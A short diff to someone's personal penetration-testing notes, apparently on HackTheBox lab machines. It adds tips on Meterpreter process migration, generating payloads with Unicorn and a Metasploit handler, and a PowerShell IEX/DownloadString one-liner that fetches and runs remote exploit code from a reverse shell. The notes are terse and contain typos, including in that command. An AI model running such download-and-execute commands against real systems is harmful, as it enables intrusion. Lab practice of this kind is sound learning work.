@@ -10,6 +10,11 @@ search for vulns in specific ports with nmap
 ........ARCTIC.....
 webpage wait 30sec for response > edit time delay in metaspolit module
 locate payload >> edite with gedit
+when meterpreter tack X32 shell >> do migrte with x64 procss then suggest
+-unicorn : shell or meterpreter from reverse shell
+unicorn give you two files 1- for msf multi handler 2- exploit code
+in our reverse shell>>
+powershell "IEX(New=object Net.WebClient).downloadString('url:port/exploit')" go to this page and execute
 
 ........BASHED.....
 bruteforce directories with <dirb> <gobaster> <wfuzz>
